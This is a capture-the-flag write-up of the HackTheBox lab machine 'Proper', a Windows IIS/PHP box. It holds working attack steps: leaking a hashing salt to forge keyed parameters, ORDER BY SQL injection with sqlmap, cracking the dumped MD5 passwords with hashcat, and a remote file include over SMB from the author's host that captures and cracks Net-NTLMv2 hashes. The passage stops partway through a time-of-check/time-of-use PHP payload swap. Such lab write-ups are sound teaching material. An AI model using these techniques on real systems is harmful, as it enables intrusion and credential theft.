---
title: HTB: Proper
url: https://0xdf.gitlab.io/2021/08/21/htb-proper.html
date: 2021-08-21T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: ctf, htb-proper, hackthebox, nmap, windows, iis, gobuster, ajax, sqlmap, sqli, keyed-hash, sqli-orderby, sqlmap-eval, hashcat, lfi, rfi, time-of-check-time-of-use, inotifywait, golang, golang-re, ida, ghidra, arbitrary-write, reverse-engineering, file-read, wertrigger, pipe-monitor, powershell, named-pipe, cve-2021-1732, htb-hackback, htb-scriptkiddie
---

![Proper](https://0xdfimages.gitlab.io/img/proper-cover.png)

Proper was a fascinating Windows box with three fascinating stages. First, there’s a SQL injection, but the url parameters are hashed with a key, so I need to leak that key, and then make sure to update the hash for each request. I get to play with the eval option for SQLmap, as well as show some manual scripting to do it. Next, there’s a time of check / time of use vulnerability in a file include that allows me to do a remote file include over SMB, swapping out the contents between the first and second read to get code execution. For root, there’s a Go binary that does cleanup of files in the users Downloads folder that I can abuse to get arbitrary write as SYSTEM. I’ll abuse this with the windows error reporting system to get execution. In Beyond Root, I’ll look at a couple more ways to get root using this binary.

## Box Info

| Name | [Proper](https://hackthebox.com/machines/proper)  [Proper](https://hackthebox.com/machines/proper) [Play on HackTheBox](https://hackthebox.com/machines/proper) |
| --- | --- |
| Release Date | [13 Mar 2021](https://twitter.com/hackthebox_eu/status/1369681315184967687) |
| Retire Date | 21 Aug 2021 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Proper |
| Radar Graph | Radar chart for Proper |
| First Blood User | 02:30:43[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 05:21:18[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [xct xct](https://app.hackthebox.com/users/13569)  [jkr jkr](https://app.hackthebox.com/users/77141) |

## Recon

### nmap

`nmap` found only HTTP (80) listening on TCP:

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.231
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 12:45 EDT
Nmap scan report for 10.10.10.231
Host is up (0.031s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
oxdf@parrot$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.10.231
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 12:45 EDT
Nmap scan report for 10.10.10.231
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: OS Tidy Inc.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds

```

Based on the [IIS](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions) version, the host is likely running Windows 10, Server 2016, or Server 2019.

### Website - TCP 80

#### Site

The site is a page for some kind of company that seems “cleaner” and “deduper” software.

[![image-20210226124236080](https://0xdfimages.gitlab.io/img/image-20210226124236080.png)](https://0xdfimages.gitlab.io/img/image-20210226124236080.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210226124236080.png)

#### Directory Brute Force

I’ll run `gobuster` against the site (including PHP extensions as I figured out it was a PHP site, see next section):

```

oxdf@parrot$ gobuster dir -u http://10.10.10.231 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 -x php -o scans/gobuster-root-small-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.231
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/03/16 12:46:22 Starting gobuster
===============================================================
/assets (Status: 301)
/licenses (Status: 301)
/functions.php (Status: 200)
/Assets (Status: 301)
/Functions.php (Status: 200)
/Licenses (Status: 301)
===============================================================
2021/03/16 12:48:21 Finished
===============================================================

```

`functions.php` returns an empty response. `/licenses` returns a login page to the “licensing portal”:

![image-20210226132522093](https://0xdfimages.gitlab.io/img/image-20210226132522093.png)

Basic guessing or sql injections didn’t find anything.

#### AJAX Query

The page is `index.html`, so that doesn’t betray the tech stack. However, looking at Burp for the history when the main page is loaded, there’s an AJAX request by Javascript to:

```

/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b

```

That shows that there are PHP pages on the site. It’s also a URL I’ll want to explore.

The response is the HTML for the various products part of the page:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 17:36:00 GMT
Connection: close
Content-Length: 10968

<div class="row"><div class="col-md-4">
            <div class="hover-item">
            <img src="assets/img/shop/memdoubler-pro.png" class="img-responsive smoothie wow fadeIn" data-wow-delay="0.5s" alt="">
            <div class="overlay-item-caption smoothie wow fadeIn" data-wow-delay="0.5s">
...[snip]...

```

This request is generated by this script in `index.html`:

```

    <script type="text/javascript">
    $(document).ready(function(){
        'use strict';
        jQuery('#headerwrap').backstretch([ "assets/img/bg/bg1.jpg", "assets/img/bg/bg3.jpg" ], {duration: 8000, fade: 500});
        $( "#product-content" ).load("/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b",function() {});
    });
    </script>

```

The site loads the basic HTML, and then issues this second request to get the products and put them into the first page.

## Access To /licenses

### Find Hash Method

#### Leak Salt

The AJAX request has two GET parameters, `order` and `h`. `order=id desc` looks like part of an SQL query. The value given in `h` looks like an MD5 hash. I’ll kick this request over to Repeater in Burp to play with.

Changing `desc` to `asc` (change sort order from descending to ascending), the page returns 403:

```

HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 17:58:07 GMT
Connection: close
Content-Length: 39

Forbidden - Tampering attempt detected.

```

Leaving `order=id desc` and making any changes to `h` also returns that same message.

My first thought was that `md5("id desc")` would match the `h`, but it doesn’t:

```

oxdf@parrot$ echo -n "id desc" | md5sum
aa5a97b10a6dd87160868d2316ab2425  -

```

Sending in `/products-ajax.php?order=id+desc&h=` with nothing following returns a 500 error:

```

HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 18:03:33 GMT
Connection: close
Content-Length: 31

Parameter missing or malformed.

```

Eventually I removed `h` entirely, sending `/products-ajax.php?order=id+desc`. This was another 500 error, but this time with crash info:

```

HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 18:04:39 GMT
Connection: close
Content-Length: 641

<!-- [8] Undefined index: h
On line 6 in file C:\inetpub\wwwroot\products-ajax.php
  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php 
  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim'); 
  3 |   include('functions.php'); 
  4 |   include('db-config.php'); 
  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                <<<<< Error encountered in this line.
  6 |     // Set the response code to 500 
  7 |     http_response_code(500); 
  8 |     // and die(). Someone fiddled with the parameters. 
  9 |     die('Parameter missing or malformed.'); 
 10 |   } 
 11 |  
// -->
Parameter missing or malformed.

```

The source shows with both 500s come from. When `h` is empty, the `if` on line 5 returns true and then the response code is set to 500 with that “missing or malformed” message. But when one of the parameters is missing entirely, PHP will crash on line 5, which is what makes this message.

#### Find Hash Algo

The source in the crash also shows the definition of a variable, `SECURE_PARAM_SALT`. In a case like this, a salt (probably more accurately a key) is used when hashing to prevent someone from guessing the algorithm and then being able to reproduce the hash.

Knowing the salt string, it’s likely combined with some part of the input before hashing The hash is likely associated with the `order` parameter. It could be just that parameter, or the entire url. I’ll start guessing at different combinations, and I found the right hash on my second guess:

```

oxdf@parrot$ echo -n "id deschie0shah6ooNoim" | md5sum
453d803378d6fb7eaf6a3cab618106d6  -
oxdf@parrot$ echo -n "hie0shah6ooNoimid desc" | md5sum
a1b30d31d344a5a4e41e8496ccbdd26b  -

```

#### Test

If this theory is right, I should now be able to change `order` to `id asc` and calculate the right hash to make the query work. I’ll start with just a HEAD request (`-I`) so my terminal doesn’t flood with HTML. Without updating the hash, it returns 403 forbidden:

```

oxdf@parrot$ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&h=a1b30d31d344a5a4e41e8496ccbdd26b'
HTTP/1.1 403 Forbidden
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 20 Aug 2021 11:27:54 GMT

```

Once I update the hash to the newly calculated value, it returns 200:

```

oxdf@parrot$ echo -n "hie0shah6ooNoimid asc" | md5sum
181345bd7fce37aad011ea65a41b60c8  -
oxdf@parrot$ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8'
HTTP/1.1 200 OK
Content-Length: 0
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 18:12:47 GMT

```

It worked!

I wrote a short Bash script that let’s me play around with this url:

```

#!/bin/bash

order=$1
h=$(echo -n "hie0shah6ooNoim${order}" | md5sum | cut -d' ' -f1)

curl -s -I -G "http://10.10.10.231/products-ajax.php" --data-urlencode "order=${order}" --data-urlencode "h=${h}" -x http://127.0.0.1:8080 |
  grep "HTTP/1.1 200 OK" && exit   

curl -i -G "http://10.10.10.231/products-ajax.php" --data-urlencode "order=${order}" --data-urlencode "h=${h}" -x http://127.0.0.1:8080

```

It takes `order` as an argument, calculates the `h`, and sends a HEAD request. If it’s an HTTP 200 it just prints that and exits (I don’t want to be flooded by all that HTML). Otherwise, it issues the prints the full response with headers so I can see errors. I can submit `id acs` without issue:

```

oxdf@parrot$ ./test_products.sh "id asc"
HTTP/1.1 200 OK

```

If I add a single quote, it crashes:

```

oxdf@parrot$ ./test_products.sh "id asc'"
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.1
Date: Fri, 26 Feb 2021 18:38:50 GMT
Connection: close
Content-Length: 0

```

### SQL Injection

#### Manual

Sending a `'` broke the site. That’s a good indication there could be SQL injection. However, injection into the `ORDER BY` part of the query is limiting. [This article from PortSwigger](https://portswigger.net/support/sql-injection-in-the-query-structure) lays it out nicely. I can’t UNION inject, add WHERE, OR, and AND at this point. The best I can do is use a `CASE` statement to check something that will return true or false and then look at the resulting order. There’s surely a way to do it without needing to know a second column in the table, but knowing the data that comes back, with a few guesses, I was able to guess a second column, `price`.

I copied my Bash script a made a slight variation:

```

#!/bin/bash

order=$1
h=$(echo -n "hie0shah6ooNoim${order}" | md5sum | cut -d' ' -f1)

curl -s -i -G "http://10.10.10.231/products-ajax.php" --data-urlencode "order=${order}" --data-urlencode "h=${h}" -x http://127.0.0.1:8080 |
  grep 'href="#">

```

This will just show me the order of the products on the page. Now run the query twice, once with false and once with true:

```

oxdf@parrot$ ./test_order.sh "(CASE WHEN (1=2) THEN id ELSE price END)"
              <h4><a href="#">Shredder Free</a></h4>
              <h4><a href="#">Deduper Free</a></h4>
              <h4><a href="#">Comparer Free</a></h4>
              <h4><a href="#">Cleaner Free</a></h4>
              <h4><a href="#">Memdoubler Pro</a></h4>
              <h4><a href="#">Comparer Pro</a></h4>
              <h4><a href="#">Cleaner Pro</a></h4>
              <h4><a href="#">Shredder Pro</a></h4>
              <h4><a href="#">Deduper Pro</a></h4>
oxdf@parrot$ ./test_order.sh "(CASE WHEN (1=1) THEN id ELSE price END)"
              <h4><a href="#">Shredder Free</a></h4>
              <h4><a href="#">Shredder Pro</a></h4>
              <h4><a href="#">Deduper Free</a></h4>
              <h4><a href="#">Deduper Pro</a></h4>
              <h4><a href="#">Comparer Free</a></h4>
              <h4><a href="#">Comparer Pro</a></h4>
              <h4><a href="#">Cleaner Free</a></h4>
              <h4><a href="#">Cleaner Pro</a></h4>
              <h4><a href="#">Memdoubler Pro</a></h4>

```

The order changes. I’ll use the last one to check the result (`| tail -1`). I can replace `1=1` with a query to ask questions of the database. For example, to check if the first letter of the current database is ‘a’:

```

oxdf@parrot$ ./test_order.sh "(CASE WHEN (SELECT SUBSTRING(database(),1,1))='a' THEN id ELSE price END)" | tail -1
              <h4><a href="#">Deduper Pro</a></h4>

```

“Deduper Pro” “means false. Trying more, it starts with `c`:

```

oxdf@parrot$ ./test_order.sh "(CASE WHEN (SELECT SUBSTRING(database(),1,1))='b' THEN id ELSE price END)" | tail -1
              <h4><a href="#">Deduper Pro</a></h4>
oxdf@parrot$ ./test_order.sh "(CASE WHEN (SELECT SUBSTRING(database(),1,1))='c' THEN id ELSE price END)" | tail -1
              <h4><a href="#">Memdoubler Pro</a></h4>

```

I can write a loop to check a given character, as this finds the second characters is `l`:

```

oxdf@parrot$ for c in {a..z}; do ./test_order.sh "(CASE WHEN (SELECT SUBSTRING(database(),2,1))=\"${c}\" THEN id ELSE price END)" | tail -1 | grep -q "Memdoubler Pro" && echo "$c" && break; done
l

```

If I wanted to go much further like this, I’d script something. But I’ll use `sqlmap`.

#### SQLmap

In the default mode, `sqlmap` will fail here because any injection it tries will result in a 500 because of the hash. However, there’s a flag, `--eval` that works perfectly for this kind of thing. In fact, the [example in the docs](https://github.com/sqlmapproject/sqlmap/wiki/Usage#evaluate-custom-python-code-during-each-request) has this case:

> In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option `--eval` that will be evaluated just before each request.
>
> For example:
>
> ```

> $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b9238\
> 20dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
>
> ```

>
> Each request of such run will re-evaluate value of GET parameter `hash` to contain a fresh MD5 hash digest for current value of parameter `id`.

The only difference is that I need to add the salt, so `--eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()"`:

```

oxdf@parrot$ sqlmap -u 'http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()" --threads 10
...[snip]...
[14:40:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:40:29] [INFO] GET parameter 'order' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=200)
[14:40:29] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'                                                     
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]                                
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]   
...[snip]...
[14:41:07] [INFO] checking if the injection point on GET parameter 'order' is a false positive
GET parameter 'order' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 314 HTTP(s) requests:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: order=(SELECT (CASE WHEN (9062=9062) THEN 'id desc' ELSE (SELECT 4887 UNION SELECT 3878) END))&h=a1b30d31d344a5a4e41e8496ccbdd26b

    Type: time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: order=id desc PROCEDURE ANALYSE(EXTRACTVALUE(7325,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4f447470))))),1)&h=a1b30d31d344a5a4e41e849
6ccbdd26b
---
[14:41:39] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2016 or 10 or 2019
web application technology: Microsoft IIS 10.0, PHP 7.4.1
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

```

I’ll run a few more `sqlmap` commands to get a feel for the DB. Each one is slow because it’s having to brute force character by character.

List DBs:

```

oxdf@parrot$ sqlmap -u 'http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()" --dbs
...[snip]...
available databases [3]:
[*] cleaner
[*] information_schema
[*] test
...[snip]...

```

Show tables in `cleaner`:

```

oxdf@parrot$ sqlmap -u 'http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()" -D cleaner --tables
...[snip]...
Database: cleaner
[3 tables]
+-----------+
| customers |
| licenses  |
| products  |
+-----------+
...[snip]...

```

Dump `customers`, which has usernames and hashes (I’m adding in `--threads` this time, as it will take *forever* without it):

```

oxdf@parrot$ sqlmap -u 'http://10.10.10.231/products-ajax.php?order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="from hashlib import md5; h = md5(f'hie0shah6ooNoim{order}'.encode()).hexdigest()" -D cleaner -T customers --dump --threads 10
...[snip]...
Database: cleaner
Table: customers
[29 entries]
+----+------------------------------+----------------------------------+----------------------+
| id | login                        | password                         | customer_name        |
+----+------------------------------+----------------------------------+----------------------+
| 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c | Vikki Solomon        |
| 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 | Neave Stone          |
| 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e | Bertie McEachern     |
| 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b | Jordana Kleiser      |
| 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b | Mariellen Chasemore  |
| 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 | Gwyneth Dornin       |
| 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 | Israel Tootell       |
| 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a | Karon Mangham        |
| 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 | Janifer Blinde       |
| 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c | Laurens Lenchenko    |
| 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad | Andreana Austin      |
| 12 | afeldmesserg@ameblo.pj       | e99a18c428cb38d5f260853678922e03 | Arnold Feldmesser    |
| 13 | ahuntarh@seattletimes.moc    | fc63f87c08d505264caba37514cd0cfd | Adella Huntar        |
| 14 | talelsandrovichi@tamu.ude    | aa47f8215c6f30a0dcdb2a36a9f4168e | Trudi Alelsandrovich |
| 15 | ishayj@dmoz.gro              | 67881381dbc68d4761230131ae0008f7 | Ivy Shay             |
| 16 | acallabyk@un.gro             | d0763edaa9d9bd2a9516280e9044d885 | Alys Callaby         |
| 17 | daeryl@about.you             | 061fba5bdfc076bb7362616668de87c8 | Dorena Aery          |
| 18 | aalekseicikm@skyrock.moc     | aae039d6aa239cfc121357a825210fa3 | Amble Alekseicik     |
| 19 | lginmann@lycos.moc           | c33367701511b4f6020ec61ded352059 | Lin Ginman           |
| 20 | lgiorioo@ow.lic              | 0acf4539a14b3aa27deeb4cbdf6e989f | Letty Giorio         |
| 21 | lbyshp@wired.moc             | adff44c5102fca279fce7559abf66fee | Lazarus Bysh         |
| 22 | bklewerq@yelp.moc            | d8578edf8458ce06fbc5bb76a58c5ca4 | Bud Klewer           |
| 23 | wstrettellr@senate.gov       | 96e79218965eb72c92a549dd5a330112 | Woodrow Strettell    |
| 24 | lodorans@kickstarter.moc     | edbd0effac3fcc98e725920a512881e0 | Lila O Doran         |
| 25 | bpfeffelt@artisteer.moc      | 670b14728ad9902aecba32e22fa4f6bd | Bibbie Pfeffel       |
| 26 | lgrimsdellu@abc.net.uvw      | 2345f10bb948c5665ef91f6773b3e455 | Luce Grimsdell       |
| 27 | lpealingv@goo.goo            | f78f2477e949bee2d12a2c540fb6084f | Lyle Pealing         |
| 28 | krussenw@mit.ude             | 0571749e2ac330a7455809c6b0e7af90 | Kimmy Russen         |
| 29 | meastmondx@businessweek.moc  | c378985d629e99a4e86213db0cd5e70d | Meg Eastmond         |
+----+------------------------------+----------------------------------+----------------------+

```

### Crack Hashes

I’ll format those in a file like:

```

vikki.solomon@throwaway.mail:7c6a180b36896a0a8c02787eeafb0e4c 

```

Now I can run them through `hashcat`, and they call break very quickly:

```

oxdf@parrot$ hashcat -m 0 db.hashes /usr/share/wordlists/rockyou.txt --user
...[snip]...
e10adc3949ba59abbe56e057f20f883e:123456          
827ccb0eea8a706c4c34a16891f84e7b:12345           
25f9e794323b453885f5181f1b624d0b:123456789       
5f4dcc3b5aa765d61d8327deb882cf99:password        
f25a2fc72690b780b2a14e140ef6a9e0:iloveyou        
8afa847f50a716e64932d995c8e7435a:princess        
fcea920f7412b5da7be0cf42b8c93759:1234567         
f806fc5a2a0d5ba2471600758452799c:rockyou         
25d55ad283aa400af464c76d713c07ad:12345678        
e99a18c428cb38d5f260853678922e03:abc123          
fc63f87c08d505264caba37514cd0cfd:nicole          
aa47f8215c6f30a0dcdb2a36a9f4168e:daniel          
67881381dbc68d4761230131ae0008f7:babygirl        
d0763edaa9d9bd2a9516280e9044d885:monkey          
061fba5bdfc076bb7362616668de87c8:lovely          
aae039d6aa239cfc121357a825210fa3:jessica         
c33367701511b4f6020ec61ded352059:654321          
0acf4539a14b3aa27deeb4cbdf6e989f:michael         
adff44c5102fca279fce7559abf66fee:ashley          
d8578edf8458ce06fbc5bb76a58c5ca4:qwerty          
96e79218965eb72c92a549dd5a330112:111111          
edbd0effac3fcc98e725920a512881e0:iloveu          
670b14728ad9902aecba32e22fa4f6bd:000000          
2345f10bb948c5665ef91f6773b3e455:michelle        
f78f2477e949bee2d12a2c540fb6084f:trigger          
0571749e2ac330a7455809c6b0e7af90:sunshine        
c378985d629e99a4e86213db0cd5e70d:chocolate       
7c6a180b36896a0a8c02787eeafb0e4c:password1       
6cb75f652a9b52798eb6cf2201057c73:password2  
...[snip]...

```

All of these creds seem to work to login at the `/licenses` page.

## Shell as web

### Enumeration /licenses

When logged in, it goes to `licenses.php`, which simply prints out a list of licenses associated with the given account:

![image-20210226155251961](https://0xdfimages.gitlab.io/img/image-20210226155251961.png)

The only interaction with the page is logging out, and the three links that change the theme between Darkly, Flatly, and Solar.

Clicking on one, in addition to changing the color, adds two parameters to the GET request:

```

http://10.10.10.231/licenses/licenses.php?theme=flatly&h=a48e169864f4b46a09d36664ec645f75

```

The salt is the same, so I don’t have to re-figure that out:

```

oxdf@parrot$ echo -n "hie0shah6ooNoimflatly" | md5sum
a48e169864f4b46a09d36664ec645f75  -

```

If I change the theme to 0xdf (and generate the matching hash), the CSS doesn’t load:

![image-20210316125420900](https://0xdfimages.gitlab.io/img/image-20210316125420900.png)

But not only are the colors gone, but there’s an error dump in the HTML source:

![image-20210226155612962](https://0xdfimages.gitlab.io/img/image-20210226155612962.png)

### PHP Analysis

PHP has two ways to load a text file into a page, as PHP to be executed, or as text. `include` will include the contents and then execute them as PHP code. This is useful to include something like a database connection. It’s also risky because if a user can get content into that include, it will execute (a file include vulnerability). `file_get_contents` returns the contents of a file to PHP as a string. Just loading user text this way isn’t inherently dangerous (though the following PHP could do dangerous things with it).

The `secure_include` function in the dump is interesting. This function calls `file_get_contents` first to load the contents of the file, and checks for any instances of `<?`. If none are found, it’s then the same file is opened with `include`. The developer of the page is checking to make sure no PHP code is passed into the include. A safer way to do this would be to just `echo` the results of the `file_get_contents` onto the page.

There are two challenges. First, I need a way to get a file I control passed into the machine. I haven’t found any upload services on this site yet. Second, I need a way to make it so that I can get PHP code past that check for `<?`.

For the first, I’ll look at remote file include possibilities, first over HTTP, and then over SMB. For the latter, because the site is fetching the data twice, there is a potential time of check / time of use vulnerability. If I can change the contents of the file between when it’s read with `file_get_contents` and when it’s opened with `include`, I can run PHP code.

I’ll also note that passing theme `0xdf` leads to loading the file `0xdf/header.inc`.

### RFI

#### HTTP

I’ll check out remote file includes by passing in a url. I’ll make my own theme and hash:

```

oxdf@parrot$ echo -n "hie0shah6ooNoimhttp://10.10.14.10/0xdfly" | md5sum
a0bd246564f657e7b152de721fa17b9f

```

On visiting `http://10.10.10.231/licenses/licenses.php?theme=http://10.10.14.10/0xdfly&h=a0bd246564f657e7b152de721fa17b9f`, I get a hit on my Python webserver:

```

oxdf@parrot$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
[10.10.10.231 - - [26/Feb/2021 16:05:40] code 404, message File not found
10.10.10.231 - - [26/Feb/2021 16:05:40] "GET /0xdfly/header.inc HTTP/1.0" 404 -

```

It’s appending `header.inc` in the folder matching the theme. I’ll create the folder and the file:

```

oxdf@parrot$ mkdir 0xdfly
oxdf@parrot$ echo "test" > 0xdfly/header.inc

```

On refreshing, there’s a request at my webserver and it returns the file, but there’s a new error in the page:

```

<!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0
On line 36 in file C:\inetpub\wwwroot\functions.php
 31 | // Following function securely includes a file. Whenever we 
 32 | // will encounter a PHP tag we will just bail out here. 
 33 | function secure_include($file) { 
 34 |   if (strpos(file_get_contents($file),'<?') === false) { 
 35 |     include($file);                <<<<< Error encountered in this line.
 36 |   } else { 
 37 |     http_response_code(403); 
 38 |     die('Forbidden - Tampering attempt detected.'); 
 39 |   } 
 40 | } 
 41 |  
// -->

```

The `file_get_contents` worked, but HTTP includes are disabled.

#### SMB

Because this is a Windows box, I’ll try SMB, by generating the hash:

```

oxdf@parrot$ echo -n "hie0shah6ooNoim\\\\10.10.14.10\\share" | md5sum
adbde0da04f46e54a67eb5c14bd6a1ae  -

```

And then visiting `http://10.10.10.231/licenses/licenses.php?theme=\\10.10.14.10\share&h=adbde0da04f46e54a67eb5c14bd6a1ae` with a Python SMB server started (`sudo smbserver.py share .`). I see it trying to connect, but failing, and then the page reports it failed to get the file. But I do capture a bunch of hashes for the user, web:

```

[*] web::PROPER:aaaaaaaaaaaaaaaa:9b66db9833525f0016ac228a9a9acb97:010100000000000000115ce0860cd70194b40cb0153cb53400000000010010004600750061004d005500620042007300030010004600750061004d005500620042007300020010006300700049006300610074007100680004001000630070004900630061007400710068000700080000115ce0860cd701060004000200000008003000300000000000000000000000002000008bcec302c2054104d6792676517675e353a03a9488d052b679a796aef6639e0c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000

```

These are Net-NTLMv2 hashes, and it cracks with `hashcat` and `rockyou.txt`:

```

oxdf@parrot$ hashcat -m 5600 web.ntlmv2 /usr/share/wordlists/rockyou.txt 
...[snip]...
WEB::PROPER:56c81e47981ecdcf:873c9c6ebad4311d8c6e784bd80c4cb7:0101000000000000c0653150de09d201f2fb407cc2690225000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000000000000002000008bcec302c2054104d6792676517675e353a03a9488d052b679a796aef6639e0c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:charlotte123!
...[snip]...

```

Now I have the password, “charlotte123!”, and I can use that to start an SMB server that Proper will connect to:

```

oxdf@parrot$ sudo smbserver.py share . -user web -password 'charlotte123!' -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

On refreshing Firefox, it gets the my `header.inc` and includes it without error:

![image-20210226163536790](https://0xdfimages.gitlab.io/img/image-20210226163536790.png)

### Bypass Check

Now that I can get a file included, I need to bypass the check for `<?` in the contents. What’s useful to me here is that it is read twice. In playing around trying to get the include to work, I noticed there was a slight lag between the two sets of activity on the SMB server.

[inotify-tools](https://github.com/inotify-tools/inotify-tools) is an awesome set of tools to monitoring for file access (`apt install inotify-tools`). I used `incron` (similar package) to automate some stuff on [ScriptKiddie](/2021/06/05/htb-scriptkiddie.html#incron). `inotify-wait` will hang until a file is accessed, and then return. So my first attempt to trick this page was to echo an ok string into `header.inc`, then `inotify-wait` for the file to be read the first time, and then replace the contents with a PHP payload. On refreshing the page, it runs:

```

oxdf@parrot$ echo "dummy header" > header.inc; inotifywait -e CLOSE header.inc; echo '<?php echo "it worked!";?>' > header.inc
Setting up watches.
Watches established.
header.inc CLOSE_NOWRITE,CLOSE 

```

It didn’t work.

![image-20210226164303521](https://0xdfimages.gitlab.io/img/image-20210226164303521.png)

At first I thought it was too slow. But on thinking about it, the error means that either the hash was mismatched (which isn’t the case), or that the `file_get_contents` read is seeing the `<?`. Does that mean that as soon as the SMB server starts to open it, I’m replacing the contents with the PHP. What if I try a sleep?

```

